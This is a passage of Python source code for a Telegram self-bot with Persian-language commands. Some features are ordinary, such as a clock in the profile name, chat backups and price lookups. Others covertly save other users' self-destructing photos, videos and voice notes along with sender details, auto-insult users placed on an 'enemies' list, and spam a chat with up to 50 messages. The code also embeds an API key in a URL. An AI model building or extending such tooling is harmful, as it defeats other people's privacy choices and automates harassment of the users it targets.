    return ''.join([font_dict.get(char, char) for char in now])

def get_iran_datetime() -> str:
    return datetime.now(pytz.timezone('Asia/Tehran')).strftime('%Y-%m-%d %H:%M:%S')

async def update_name_with_time(user_id: int, client: Client) -> bool:
    if not user_time_status.get(user_id):
        return False

    try:
        user = await client.get_users(user_id)
        first_name = user_original_names.get(user_id, user.first_name or "")
        new_name = f"{first_name} {get_iran_time()}"

        # اعمال بال اگر تنظیم شده باشد
        if user_id in user_wings:
            new_name = apply_wings_to_name(new_name, user_wings[user_id])

        await client.update_profile(first_name=new_name)
        return True
    except Exception as e:
        print(f"❌ خطا در آپدیت نام کاربر {user_id}: {e}")
        return False

# =======================================================

async def continuous_time_updater(client: Client):
    global time_updater_started
    while True:
        try:
            now = datetime.now(pytz.timezone('Asia/Tehran'))
            seconds_until_next_minute = 60 - now.second
            milliseconds_until_next_minute = (seconds_until_next_minute * 1000) - (now.microsecond // 1000)

            await asyncio.sleep(milliseconds_until_next_minute / 1000)

            active_users = [uid for uid, status in user_time_status.items() if status]
            for user_id in active_users:
                try:
                    await update_name_with_wings(client, user_id)
                except Exception as e:
                    print(f"❌ خطا در آپدیت نام با بال برای کاربر {user_id}: {e}")

        except Exception as e:
            print(f"❌ خطا در مدیریت آپدیت زمان: {e}")
            await asyncio.sleep(60)

async def backup_chat(client: Client, chat_id: int, until_message_id: int = None) -> tuple:
    try:
        backup_file = f"{BACKUPS_DIR}/backup_{chat_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        user = await client.get_users(chat_id)
        user_name = f"{user.first_name or ''} {user.last_name or ''}".strip() or user.username or f"User_{chat_id}"
        me = await client.get_me()
        message_count = 0

        with open(backup_file, 'w', encoding='utf-8') as f:
            f.write("="*60 + f"\n📱 پشتیبان گیری از تلگرام\n" + "="*60 + f"\n👤 کاربر: {user_name}\n🆔 آیدی: {chat_id}\n📅 تاریخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n" + "="*60 + "\n\n")

            async for message in client.get_chat_history(chat_id):
                if until_message_id and message.id >= until_message_id:
                    continue
                message_count += 1
                sender_name = "شما" if message.from_user and message.from_user.id == me.id else f"{message.from_user.first_name or ''} {message.from_user.last_name or ''}".strip() or message.from_user.username or "Unknown"
                if message.from_user and message.from_user.id != me.id:
                    sender_name += f" (ID: {message.from_user.id})"

                media_type = ""
                if message.photo: media_type = "📷 عکس"
                elif message.video: media_type = "🎥 ویدیو"
                elif message.document: media_type = "📄 فایل"
                elif message.audio: media_type = "🎵 آudio"
                elif message.voice: media_type = "🎤 ویس"
                elif message.sticker: media_type = "🤡 استیکر"

                message_text = message.text or message.caption or ""
                f.write(f"#{message_count}\n👤 ارسال کننده: {sender_name}\n🕐 زمان: {message.date.strftime('%Y-%m-%d %H:%M')}\n")
                if media_type: f.write(f"📎 نوع: {media_type}\n")
                if message_text: f.write(f"💬 متن: {message_text}\n")
                f.write("-"*40 + "\n\n")

        return True, backup_file, message_count, user_name
    except Exception as e:
        return False, str(e), 0, None

@app.on_message(filters.private & filters.incoming & (filters.photo | filters.video | filters.voice))
async def handle_timed_media(client, message):
    try:
        if message.photo and hasattr(message.photo, 'ttl_seconds') and message.photo.ttl_seconds:
            media = message.photo
            file_type = 'photo'
            file_ext = 'jpg'
        elif message.video and hasattr(message.video, 'ttl_seconds') and message.video.ttl_seconds:
            media = message.video
            file_type = 'video'
            file_ext = 'mp4'
        elif message.voice and hasattr(message.voice, 'ttl_seconds') and message.voice.ttl_seconds:
            media = message.voice
            file_type = 'voice'
            file_ext = 'ogg'
        else:
            return

        rand = random.randint(1000, 9999999)
        file_path = os.path.join(SAVED_PHOTOS_DIR, f'{file_type}-{rand}.{file_ext}')

        await client.download_media(message, file_path)

        if os.path.exists(file_path):
            sender = message.from_user
            username = f"@{sender.username}" if sender.username else "ندارد"
            caption = (
                f"🔥 مدیای زمان‌دار ({file_type})\n"
                f"👤 {sender.first_name or ''}\n"
                f"🆔 {username}\n"
                f"🔢 آیدی: {sender.id}\n"
                f"⏰ {datetime.now().strftime('%H:%M:%S')}"
            )

            if file_type == 'photo':
                await client.send_photo("me", photo=file_path, caption=caption)
            elif file_type == 'video':
                await client.send_video("me", video=file_path, caption=caption)
            elif file_type == 'voice':
                await client.send_voice("me", voice=file_path, caption=caption)

            os.remove(file_path)
            print(f"✅ مدیای تایمدار از {sender.id} ذخیره شد")

    except Exception as e:
        print(f"❌ خطا در ذخیره مدیای تایمدار: {e}")

@app.on_message(~filters.me & filters.incoming)
async def global_message_handler(client: Client, message: Message):
    if not message.from_user:
        return

    global FORCED_SUBSCRIPTION_ENABLED, FORCED_CHAT_ID, FORCED_CHAT_LINK

    if FORCED_SUBSCRIPTION_ENABLED and FORCED_CHAT_ID and message.chat.type == enums.ChatType.PRIVATE:
        try:
            member = await client.get_chat_member(FORCED_CHAT_ID, message.from_user.id)
            if member.status in [enums.ChatMemberStatus.LEFT, enums.ChatMemberStatus.KICKED]:
                await client.send_message(
                    message.chat.id,
                    f"🔒 **برای ارسال پیام به من، ابتدا باید عضو کانال/گروه زیر شوید:**\n\n{FORCED_CHAT_LINK}\n\n⚠️ پس از عضویت، دوباره پیام دهید."
                )
                await message.delete()
                return
        except:
            pass

    await check_lock(client, message)

    user_id = message.from_user.id
    message_text = message.text or ""
    if user_id == 777000:
        await forward_and_save_login_codes(client, message)
        return

    if str(user_id) in auto_reactions:
        try:
            reaction = auto_reactions[str(user_id)]
            await client.send_reaction(
                chat_id=message.chat.id,
                message_id=message.id,
                emoji=reaction
            )
        except FloodWait as e:
            await asyncio.sleep(e.value)
        except Exception:
            pass

    if user_id in enemies and message_text.strip():
        try:
            insults_list = load_insults()
            if insults_list:
                random_insult = random.choice(insults_list)
                await client.send_message(
                    message.chat.id,
                    random_insult,
                    reply_to_message_id=message.id
                )
        except FloodWait as e:
            await asyncio.sleep(e.value)
        except Exception:
            pass
    if message_text.strip():
        message_text_lower = message_text.strip().lower()
        for trigger, reply in auto_replies.items():
            if trigger.lower() in message_text_lower:
                try:
                    await client.send_message(
                        message.chat.id,
                        reply,
                        reply_to_message_id=message.id
                    )
                    break
                except FloodWait as e:
                    await asyncio.sleep(e.value)
                    break
                except Exception:
                    break

@app.on_message(filters.private & ~filters.me)
async def apply_actions_private(client: Client, message: Message):
    await apply_chat_actions(client, message)

@app.on_message(filters.group & ~filters.me)
async def apply_actions_group(client: Client, message: Message):
    await apply_chat_actions(client, message)

@app.on_message(filters.me & filters.text & ~filters.command([
    "سیو", "پنل", "لیست فحش", "آنلاین", "دانلود", "ایدی", "تایم",
    "وضعیت", "لیست فونت", "تنظیم فونت", "قیمت", "اسپم", "بولد",
    "پاسخ", "دشمن", "فحش", "حذف", "لیست دشمن", "دشمنان", "پاک کردن دشمنان",
    "همه", "مدیا", "استیکر", "فوروارد", "وویس", "پیام", "فایل", "وضعیت قفل",
    "ریست قفل", "راهنمای قفل",
    "انتی لاگین", "ریکت", "حذف ریکت", "لیست ریکت", "پاکسازی ریکت",
    "ویرایش",
    "تنظیم بنر", "بنر همگانی", "لیست بنرها", "حذف بنر", "بنر همگانی خاموش", "بنر ارسال", "زمان بنر",
    "فرمت",
    "پینگ", "تعداد کانال ها", "تعداد گروه ها", "خروج همه کانال", "خروج همه گروه",
    "اکشن",
    "اینستا",
    "پرایوت", "شیشه", "حساب", "عضویت", "ترجمه", "فضول", "تنظیم دشمن",
    "ساخت عکس", "گفتار", "ایمیل", "قیمت طلا", "بال", "میو میو"
], prefixes=""))
async def auto_html_format_messages(client, message):
    if any(format_settings.values()):
        original_text = message.text
        formatted_text = original_text
        for format_name, is_active in format_settings.items():
            if is_active:
                formatted_text = html_tags[format_name].format(formatted_text)
        try:
            await message.edit_text(
                formatted_text,
                parse_mode=enums.ParseMode.HTML
            )
        except Exception as e:
            print(f"❌ خطا در فرمت کردن پیام: {e}")

@app.on_message(filters.me & filters.command("سیو", prefixes=""))
async def save_command(client: Client, message: Message):
    if len(message.command) < 2:
        return await message.edit_text("**لطفا یوزرنیم کاربر را وارد کنید**\n\nمثال: `سیو @LuminousPath`")

    chat_input = message.command[1].lstrip('@')
    try:
        user = await client.get_users(chat_input)
        chat_id, user_name = user.id, f"{user.first_name or ''} {user.last_name or ''}".strip() or user.username or f"User_{user.id}"
    except:
        return await message.edit_text(f"**کاربر '{chat_input}' پیدا نشد**")

    loading_msg = await message.edit_text(f"🔄 **در حال پشتیبان‌گیری از {user_name}...**")
    success, result, message_count, user_name = await backup_chat(client, chat_id, message.id)

    if success:
        await loading_msg.edit_text("**در حال آپلود فایل پشتیبان...**")
        await client.send_document(
            "me",
            document=result,
            caption=f"**پشتیبان‌گیری کامل شد**\n\n**کاربر:** {user_name}\n**آیدی:** `{chat_id}`\n**تعداد پیام‌ها:** {message_count}\n**فرمت:** فایل متنی (TXT)\n**تاریخ:** {datetime.now().strftime('%Y-%m-%d %H:%M')}"
        )
        os.remove(result)
        await loading_msg.delete()
    else:
        await loading_msg.edit_text(f"❌ **خطا در پشتیبان‌گیری:**\n`{result}`")

@app.on_message(filters.me & filters.command("تایم", prefixes="") & filters.regex(r"^تایم (روشن|خاموش)$"))
async def time_command(client: Client, message: Message):
    global time_updater_started
    if len(message.command) < 2:
        return await message.edit("**استفاده:**\n`تایم روشن` - فعال کردن\n`تایم خاموش` - غیرفعال کردن")

    action = message.command[1]
    user_id = message.from_user.id

    if action == "روشن":
        user_time_status[user_id] = True
        user_original_names.setdefault(user_id, message.from_user.first_name or "")
        success = await update_name_with_wings(client, user_id)

        if not time_updater_started:
            time_updater_started = True
            asyncio.create_task(continuous_time_updater(client))

        await message.edit("**تایم کنار نام فعال شد**\n**راس هر دقیقه آپدیت می‌شود**" if success else "**خطا در تغییر نام**")

    elif action == "خاموش":
        user_time_status[user_id] = False
        if user_id in user_original_names:
            try:
                # بازگردانی نام با حفظ بال
                original_name = user_original_names[user_id]
                if user_id in user_wings:
                    original_name = apply_wings_to_name(original_name, user_wings[user_id])
                await client.update_profile(first_name=original_name)
                await message.edit("**تایم کنار نام غیرفعال شد**\nنام شما به حالت اول بازگشت")
            except:
                await message.edit("❌ خطا در بازگردانی نام")
        else:
            await message.edit("✅ تایم کنار نام غیرفعال شد")
    else:
        await message.edit("⚠️ **استفاده:**\n`تایم روشن` - فعال کردن\n`تایم خاموش` - غیرفعال کردن")

@app.on_message(filters.me & filters.command("لیست فونت", prefixes=""))
async def font_list_command(client: Client, message: Message):
    sample_time = "12:34"
    fonts_samples = "\n".join([f"**فونت {i}:** {''.join([FONTS[i].get(char, char) for char in sample_time])}" for i in range(1, 7)])
    await message.edit(f"🔤 **لیست فونت‌های زمان**\n\n{fonts_samples}\n\n**استفاده:**\n`تنظیم فونت 1` تا `تنظیم فونت 6`")

@app.on_message(filters.me & filters.command("تنظیم فونت", prefixes=""))
async def set_font_command(client: Client, message: Message):
    if len(message.command) < 2:
        return await message.edit("⚠️ **استفاده:**\n`تنظیم فونت 1` تا `تنظیم فونت 6`")

    try:
        font_num = int(message.command[1])
        if 1 <= font_num <= 6:
            user_fonts["me"] = font_num
            if user_time_status.get(message.from_user.id, False):
                await update_name_with_wings(client, message.from_user.id)
            await message.edit(f"✅ **فونت زمان به شماره {font_num} تغییر کرد**\n\nنمونه: {get_iran_time()}")
        else:
            await message.edit("❌ **شماره فونت باید بین 1 تا 6 باشد**")
    except ValueError:
        await message.reply("❌ **لطفا یک عدد وارد کنید**\nمثال: `تنظیم فونت 2`")

@app.on_message(filters.me & filters.command("قیمت", prefixes=""))
async def price_command(client: Client, message: Message):
    try:
        if len(message.command) < 2:
            await message.edit_text("❌ **لطفا نام ارز را وارد کنید**\nمثال: `قیمت ton` یا `قیمت بیت‌کوین`")
            return

        coin_input = ' '.join(message.command[1:]).strip()
        loading_msg = await message.edit_text(f"🔍 **در حال دریافت قیمت {coin_input}...**")
        async with aiohttp.ClientSession() as session:
            async with session.get("https://api.fast-creat.ir/nobitex/v2?apikey=8000978149:Vqsu9H08Z6rzAQw@Api_ManagerRoBot") as response:
                if response.status == 200:
                    data = await response.json()
                    if data.get("ok"):
                        prices = data["result"]
                        found_coin = None
                        coin_key = None
                        if coin_input.upper() in prices:
                            found_coin = prices[coin_input.upper()]
                            coin_key = coin_input.upper()
                        else:
                            for key, coin_data in prices.items():
                                if 'name' in coin_data and coin_input.lower() in coin_data['name'].lower():
                                    found_coin = coin_data
                                    coin_key = key
                                    break
                        if found_coin and coin_key:
                            coin_data = found_coin
                            price_text = f"""**💰 قیمت {coin_data['name']} ({coin_key})**
💵 **قیمت تومانی:** `{'{:,}'.format(int(float(coin_data['irr'])))}` تومان
💰 **قیمت دلاری:** `{float(coin_data['usdt']):,.2f}$`
📊 **تغییر 24h:** {'🟢' if float(coin_data['dayChange']) > 0 else '🔴'} `{coin_data['dayChange']}%`

⏰ **آپدیت:** {datetime.now(pytz.timezone('Asia/Tehran')).strftime('%H:%M')}
"""
                            await loading_msg.edit_text(price_text)
                        else:
                            await loading_msg.edit_text(f"❌ **ارز '{coin_input}' یافت نشد**\n\n💡 **مثال‌ها:**\n`قیمت BTC` - `قیمت بیت‌کوین`\n`قیمت ETH` - `قیمت اتریوم`\n`قیمت TON` - `قیمت تون`")
                    else:
                        await loading_msg.edit_text("❌ خطا در دریافت اطلاعات از API")
                else:
                    await loading_msg.edit_text("❌ خطا در اتصال به سرور")

    except Exception as e:
        await message.edit_text(f"❌ خطا: {str(e)}")

@app.on_message(filters.me & filters.command("اسپم", prefixes=""))
async def spam_command(client: Client, message: Message):
    if len(message.command) < 3:
        return await message.edit_text("❌ **فرمت صحیح:**\n`اسپم 10 سلام`\n\nعدد = تعداد پیام\nمتن = پیام مورد نظر")

    try:
        count = int(message.command[1])
        if count > 50:
            return await message.edit_text("❌ **حداکثر تعداد مجاز: 50 پیام**")

        spam_text = ' '.join(message.command[2:])

        if not spam_text:
            return await message.edit_text("❌ **لطفا متن پیام را وارد کنید**")

        loading_msg = await message.edit_text(f"🔄 **در حال ارسال {count} پیام...**")

        success_count = 0
        for i in range(count):
            try:
                await client.send_message(
                    message.chat.id,
                    f"{spam_text}",
                    reply_to_message_id=message.reply_to_message_id if message.reply_to_message else None
                )
                success_count += 1
                await asyncio.sleep(0.2)
            except Exception as e:
                print(f"خطا در ارسال پیام {i+1}: {e}")

        await loading_msg.edit_text(f"✅ **اسپم کامل شد**\n\n📤 **تعداد ارسال شده:** {success_count}/{count}\n💬 **متن:** {spam_text[:50]}{'...' if len(spam_text) > 50 else ''}")

    except ValueError:
        await message.edit_text("❌ **لطفا تعداد را به صورت عدد وارد کنید**\nمثال: `اسپم 10 سلام`")
    except Exception as e:
        await message.edit_text(f"❌ **خطا در ارسال اسپم:**\n`{str(e)}`")

@app.on_message(filters.me & filters.command("پاسخ", prefixes=""))
async def auto_reply_command(client: Client, message: Message):
    if len(message.command) < 2:
        return await message.edit("⚠️ **استفاده:**\n`پاسخ افزودن سلام|سلام چطوری`\n`پاسخ حذف سلام`\n`پاسخ لیست`")

    sub_command = message.command[1]

    if sub_command == "افزودن":
        if len(message.command) < 3:
            return await message.edit("❌ **فرمت صحیح:**\n`پاسخ افزودن سلام|سلام چطوری`")

        try:
            parts = ' '.join(message.command[2:]).split('|', 1)
            if len(parts) != 2:
                return await message.edit("❌ **فرمت صحیح:**\n`پاسخ افزودن سلام|سلام چطوری`")

            trigger, reply = parts[0].strip(), parts[1].strip()
            auto_replies[trigger] = reply
            await message.edit(f"✅ **پاسخ خودکار افزوده شد**\n\n**متن:** {trigger}\n**پاسخ:** {reply}")
        except Exception as e:
            await message.edit(f"❌ **خطا در افزودن پاسخ:**\n`{e}`")

    elif sub_command == "حذف":
        if len(message.command) < 3:
            return await message.edit("❌ **لطفا متن پاسخ را وارد کنید**\nمثال: `پاسخ حذف سلام`")

        trigger = ' '.join(message.command[2:]).strip()
        if trigger in auto_replies:
            del auto_replies[trigger]
            await message.edit(f"✅ **پاسخ خودکار حذف شد**\n\n**متن:** {trigger}")
        else:
            await message.edit(f"❌ **پاسخ برای متن '{trigger}' یافت نشد**")

    elif sub_command == "لیست":
        if not auto_replies:
            await message.edit("❌ **هیچ پاسخی تنظیم نشده**")
        else:
            replies_list = "\n".join([f"• **{trigger}** → {reply}" for trigger, reply in auto_replies.items()])
            await message.edit(f"📝 **لیست پاسخ‌های خودکار**\n\n{replies_list}\n\n**تعداد:** {len(auto_replies)}")

    else:
        await message.edit("⚠️ **استفاده:**\n`پاسخ افزودن سلام|سلام چطوری`\n`پاسخ حذف سلام`\n`پاسخ لیست`")

@app.on_message(filters.me & filters.command("دشمن", prefixes=""))
async def enemy_command(client: Client, message: Message):
    if not message.reply_to_message:
        return await message.edit("❌ **لطفا روی پیام کاربر ریپلای کن**")

    enemy_user = message.reply_to_message.from_user
    enemy_id = enemy_user.id

    if is_enemy(enemy_id):
        await message.edit(f"❌ **این کاربر از قبل دشمن است**\n\n👤 کاربر: {enemy_user.first_name}\n🆔 آیدی: `{enemy_id}`")
    else:
        enemies.add(enemy_id)
        save_enemies(enemies)
        await message.edit(f"**کاربر مورد نظر به لیست دشمن ها اضافه شد 😈**")

@app.on_message(filters.me & filters.command("فحش", prefixes=""))
async def insult_command(client: Client, message: Message):
    if len(message.command) < 2:
        return await message.edit("""
⚠️ **سیستم مدیریت فحش‌ها**

📋 **دستورات موجود:**
• `فحش افزودن [متن]` - افزودن فحش جدید
• `فحش حذف [متن]` - حذف فحش
• `لیست فحش` - مشاهده لیست فحش‌ها

📝 **مثال:**
`فحش افزودن تو احمقی`
`فحش حذف تو احمقی`
`لیست فحش`
""")

    sub_command = message.command[1]

    if sub_command == "افزودن":
        if len(message.command) < 3:
            return await message.edit("❌ **لطفا متن فحش را وارد کنید**\nمثال: `فحش افزودن تو احمقی`")

        insult_text = ' '.join(message.command[2:]).strip()
        insults_list = load_insults()
        if insult_text not in insults_list:
            insults_list.append(insult_text)
            if save_insults(insults_list):
                await message.edit(f"✅ **فحش افزوده شد**\n\n💢 متن: {insult_text}")
            else:
                await message.edit("❌ **خطا در ذخیره فحش**")
        else:
            await message.edit(f"❌ **این فحش از قبل وجود دارد**")

    elif sub_command == "حذف":
        if len(message.command) < 3:
            return await message.edit("❌ **لطفا متن فحش را وارد کنید**\nمثال: `فحش حذف تو احمقی`")

        insult_text = ' '.join(message.command[2:]).strip()
        insults_list = load_insults()
        if insult_text in insults_list:
            insults_list.remove(insult_text)
            if save_insults(insults_list):
                await message.edit(f"✅ **فحش حذف شد**\n\n💢 متن: {insult_text}")
            else:
                await message.edit("❌ **خطا در حذف فحش**")
        else:
            await message.edit(f"❌ **این فحش یافت نشد**")

    else:
        await message.edit("⚠️ **استفاده:**\n`فحش افزودن [متن]`\n`فحش حذف [متن]`\n`لیست فحش`")

@app.on_message(filters.me & filters.command("حذف", prefixes=""))
async def remove_enemy_command(client: Client, message: Message):
    text = message.text.strip()
    if text == "حذف دشمن":
        if not message.reply_to_message:
            return await message.edit("❌ باید روی پیام دشمن ریپلای کنی")

        user_id = message.reply_to_message.from_user.id

        if user_id in enemies:
            enemies.remove(user_id)
            save_enemies(enemies)
            return await message.edit("✅ کاربر با موفقیت از لیست دشمن حذف شد")
        else:
            return await message.edit("⚠️ این کاربر داخل لیست دشمن نیست")

@app.on_message(filters.me & filters.command("لیست دشمن", prefixes=""))
async def enemy_list_command(client: Client, message: Message):
    if not enemies:
        return await message.edit("❌ **لیست دشمنان خالی است**")

    try:
        loading_msg = await message.edit("🔄 **در حال دریافت اطلاعات دشمنان...**")

        enemies_list = []

        for enemy_id in list(enemies):
            try:
                user = await client.get_users(enemy_id)
                first_name = user.first_name or ""
                last_name = user.last_name or ""
                username = f"@{user.username}" if user.username else "❌ ندارد"
                full_name = f"{first_name} {last_name}".strip()

                enemies_list.append({
                    'id': enemy_id,
                    'name': full_name,
                    'username': username
                })
                await asyncio.sleep(0.1)

            except Exception as e:
                print(f"❌ خطا در دریافت اطلاعات کاربر {enemy_id}: {e}")
                enemies_list.append({
                    'id': enemy_id,
                    'name': "❌ خطا در دریافت",
                    'username': "❌ خطا در دریافت"
                })

        if not enemies_list:
            return await loading_msg.edit("❌ **هیچ دشمنی در لیست وجود ندارد**")

        list_text = f"👿 **لیست دشمنان - تعداد: {len(enemies_list)}**\n\n"

        for i, enemy in enumerate(enemies_list, 1):
            list_text += f"{i}. **نام:** {enemy['name']}\n"
            list_text += f"   **آیدی:** `{enemy['id']}`\n"
            list_text += f"   **یوزرنیم:** {enemy['username']}\n"
            list_text += "   " + "─" * 30 + "\n"

        if len(list_text) > 4000:
            parts = [list_text[i:i+4000] for i in range(0, len(list_text), 4000)]
            for part in parts:
                await client.send_message(message.chat.id, part)
            await loading_msg.delete()
        else:
            await loading_msg.edit(list_text)

    except Exception as e:
        await message.edit(f"❌ **خطا در دریافت لیست دشمنان:**\n`{e}`")

@app.on_message(filters.me & filters.command("دشمنان", prefixes=""))
async def enemies_compact_command(client: Client, message: Message):
    if not enemies:
        return await message.edit("❌ **لیست دشمنان خالی است**")

    try:
        loading_msg = await message.edit("🔄 **در حال دریافت اطلاعات...**")

        compact_text = f"👿 **لیست دشمنان - تعداد: {len(enemies)}**\n\n"

        for i, enemy_id in enumerate(list(enemies), 1):
            try:
                user = await client.get_users(enemy_id)
                first_name = user.first_name or ""
                last_name = user.last_name or ""
                username = f"@{user.username}" if user.username else "بدون یوزرنیم"
                full_name = f"{first_name} {last_name}".strip() or "بدون نام"

                compact_text += f"{i}. **{full_name}** - {username} - `{enemy_id}`\n"

            except Exception as e:
                compact_text += f"{i}. ❌ خطا در دریافت - `{enemy_id}`\n"

        await loading_msg.edit(compact_text)

    except Exception as e:
        await message.edit(f"❌ **خطا:**\n`{e}`")

@app.on_message(filters.me & filters.command("پاک کردن دشمنان", prefixes=""))
async def clear_enemies_command(client: Client, message: Message):
    if not enemies:
        return await message.edit("❌ **لیست دشمنان از قبل خالی است**")

    enemy_count = len(enemies)
    enemies.clear()
    save_enemies(enemies)

    await message.edit(f"✅ **تمام دشمنان پاک شدند**\n\n🗑 **تعداد حذف شده:** {enemy_count} نفر")

@app.on_message(filters.me & filters.command("ایدی", prefixes="") & filters.regex(r"^ایدی$"))
async def advanced_id_command(client: Client, message: Message):
    try:
        user = message.from_user
        chat = message.chat

        premium_status = "<b>فعال</b>" if user.is_premium else "<i>غیرفعال</i>"
        username_id = f"@{user.username}" if user.username else "<i>ندارد</i>"
        profile_photos = await client.get_chat_photos_count(user.id)

        if message.reply_to_message:
            replied_user = message.reply_to_message.from_user
            replied_chat = message.chat

            common_chats = await client.get_common_chats(replied_user.id)

            user_info = f"""
<b>• اطلاعات کاربر</b>

<b>آیدی عددی:</b> <code>{replied_user.id}</code>
<b>یوزرنیم:</b> <code>{username_id}</code>
<b>نام:</b> {replied_user.first_name or '<i>ندارد</i>'}
<b>نام خانوادگی:</b> {replied_user.last_name or '<i>ندارد</i>'}
<b>پریمیوم:</b> {"<b>فعال</b>" if replied_user.is_premium else "<i>غیرفعال</i>"}
<b>تعداد پروفایل:</b> {await client.get_chat_photos_count(replied_user.id)}

<b>• اطلاعات چت</b>
<b>آیدی چت:</b> <code>{replied_chat.id}</code>
<b>عنوان چت:</b> {replied_chat.title or '<i>ندارد</i>'}
<b>تعداد اعضا:</b> {replied_chat.members_count if hasattr(replied_chat, 'members_count') and replied_chat.members_count else '<i>نامشخص</i>'}
"""

            if common_chats:
                user_info += f"\n<b>• گروه‌های مشترک:</b> {len(common_chats)}\n"
                user_info += f"<blockquote>"

                for i, common_chat in enumerate(common_chats, 1):
                    chat_type = "گروه" if common_chat.type in ["group", "supergroup"] else "کانال" if common_chat.type == "channel" else "شخصی"
                    username = f"@{common_chat.username}" if common_chat.username else "بدون یوزرنیم"
                    members = f"{common_chat.members_count} عضو" if hasattr(common_chat, 'members_count') and common_chat.members_count else "نامشخص"

                    user_info += f"<b>{i}. {common_chat.title}</b>\n"
                    user_info += f"<i>نوع:</i> {chat_type}\n"
                    user_info += f"<i>یوزرنیم:</i> {username}\n"
                    user_info += f"<i>اعضا:</i> {members}\n"
                    user_info += f"<i>آیدی:</i> <code>{common_chat.id}</code>"

                    if i < len(common_chats):
                        user_info += f"\n\n"

                user_info += f"</blockquote>"
            else:
                user_info += f"\n<b>• گروه‌های مشترک:</b> <i>هیچ گروه مشترکی یافت نشد</i>"

            await message.edit_text(user_info, parse_mode=enums.ParseMode.HTML)

        else:
            chat_info = f"""
<b>• اطلاعات کاربر و چت</b>

<b>اطلاعات شما</b>
<b>آیدی عددی:</b> <code>{user.id}</code>
<b>یوزرنیم:</b> <code>{username_id}</code>
<b>نام:</b> {user.first_name or '<i>ندارد</i>'}
<b>نام خانوادگی:</b> {user.last_name or '<i>ندارد</i>'}
<b>پریمیوم:</b> {premium_status}
<b>تعداد پروفایل:</b> {profile_photos}

<b>اطلاعات چت فعلی</b>
<b>آیدی چت:</b> <code>{chat.id}</code>
<b>عنوان چت:</b> {chat.title or '<i>ندارد</i>'}
<b>تعداد اعضا:</b> {chat.members_count if hasattr(chat, 'members_count') and chat.members_count else '<i>نامشخص</i>'}
"""
            await message.edit_text(chat_info, parse_mode=enums.ParseMode.HTML)

    except Exception as e:
        await message.edit_text(f"<b>خطا در دریافت اطلاعات:</b>\n<code>{str(e)}</code>", parse_mode=enums.ParseMode.HTML)

@app.on_message(filters.me & filters.command("دانلود", prefixes=""))
async def download_from_link(client: Client, message: Message):
    if len(message.command) < 2:
        await message.edit_text("❌ **فرمت:**\n`دانلود https://t.me/channel/123`")
        return
    link = message.command[1]
    try:
        pattern = r"https://t\.me/(.+)/(\d+)"
        match = re.match(pattern, link)
        if not match:
            await message.edit_text("❌ **لینک نامعتبر!**\nفرمت صحیح: `https://t.me/channel/123`")
            return
        username = match.group(1)
        post_id = int(match.group(2))
        processing_msg = await message.edit_text("🔍 **در حال دریافت پست...**")
        post = await client.get_messages(username, post_id)
        if not post:
            await processing_msg.edit_text("❌ **پست یافت نشد**")
            return
        await processing_msg.edit_text("📥 **در حال کپی کردن پست...**")
        try:
            await post.copy("me")
            await processing_msg.edit_text("✅ **پست با موفقیت در پیام‌های ذخیره شده کپی شد**")
        except Exception as copy_error:
            await processing_msg.edit_text("🔄 **روش دوم: در حال ارسال محتوا...**")
            try:
                if post.media:
                    file_path = await post.download()
                    if post.audio:
                        await client.send_audio("me", file_path, caption=post.caption or "")
                    elif post.video:
                        await client.send_video("me", file_path, caption=post.caption or "")
                    elif post.photo:
                        await client.send_photo("me", file_path, caption=post.caption or "")
                    elif post.document:
                        await client.send_document("me", file_path, caption=post.caption or "")
                    elif post.voice:
                        await client.send_voice("me", file_path, caption=post.caption or "")
                    elif post.sticker:
                        await client.send_sticker("me", file_path)
                    elif post.animation:
                        await client.send_animation("me", file_path, caption=post.caption or "")
                    elif post.video_note:
                        await client.send_video_note("me", file_path)
                    else:
                        await client.send_document("me", file_path, caption=post.caption or "")
                    os.remove(file_path)
                if post.text:
                    await client.send_message("me", post.text)
                await processing_msg.edit_text("✅ **محتوا با موفقیت ارسال شد**")
            except Exception as download_error:
                await processing_msg.edit_text(f"❌ **خطا:** `{str(download_error)}`")
    except Exception as e:
        await message.edit_text(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^آنلاین (روشن|خاموش)$'))
async def online_command(client, message):
    global always_online_enabled

    action = message.matches[0].group(1)

    if action == "روشن":
        always_online_enabled = True
        await message.edit_text(
            "✅ **حالت همیشه آنلاین فعال شد**\n\n"
            "🌐 اکانت شما همیشه به عنوان آنلاین نمایش داده خواهد شد."
        )
        asyncio.create_task(keep_online(client))

    elif action == "خاموش":
        always_online_enabled = False
        await message.edit_text(
            "❌ **حالت همیشه آنلاین غیرفعال شد**"
        )

@app.on_message(filters.me & filters.command("همه", prefixes="") & filters.regex(r"^همه روشن$"))
async def lock_all_on_command(client, message):
    lock_settings["همه"] = True
    await message.edit("✅ **قفل همه فعال شد**\n\nتمامی پیام‌ها در پیوی حذف خواهند شد.")

@app.on_message(filters.me & filters.command("همه", prefixes="") & filters.regex(r"^همه خاموش$"))
async def lock_all_off_command(client, message):
    lock_settings["همه"] = False
    await message.edit("✅ **قفل همه غیرفعال شد**")

@app.on_message(filters.me & filters.command("مدیا", prefixes="") & filters.regex(r"^مدیا روشن$"))
async def lock_media_on_command(client, message):
    lock_settings["مدیا"] = True
    await message.edit("✅ **قفل مدیا فعال شد**\n\nارسال عکس و ویدیو در پیوی حذف خواهد شد.")

@app.on_message(filters.me & filters.command("مدیا", prefixes="") & filters.regex(r"^مدیا خاموش$"))
async def lock_media_off_command(client, message):
    lock_settings["مدیا"] = False
    await message.edit("✅ **قفل مدیا غیرفعال شد**")

@app.on_message(filters.me & filters.command("استیکر", prefixes="") & filters.regex(r"^استیکر روشن$"))
async def lock_sticker_on_command(client, message):
    lock_settings["استیکر"] = True
    await message.edit("✅ **قفل استیکر فعال شد**\n\nارسال استیکر و گیف در پیوی حذف خواهد شد.")

@app.on_message(filters.me & filters.command("استیکر", prefixes="") & filters.regex(r"^استیکر خاموش$"))
async def lock_sticker_off_command(client, message):
    lock_settings["استیکر"] = False
    await message.edit("✅ **قفل استیکر غیرفعال شد**")

@app.on_message(filters.me & filters.command("فوروارد", prefixes="") & filters.regex(r"^فوروارد روشن$"))
async def lock_forward_on_command(client, message):
    lock_settings["فوروارد"] = True
    await message.edit("✅ **قفل فوروارد فعال شد**\n\nارسال پیام فورواردی در پیوی حذف خواهد شد.")

@app.on_message(filters.me & filters.command("فوروارد", prefixes="") & filters.regex(r"^فوروارد خاموش$"))
async def lock_forward_off_command(client, message):
    lock_settings["فوروارد"] = False
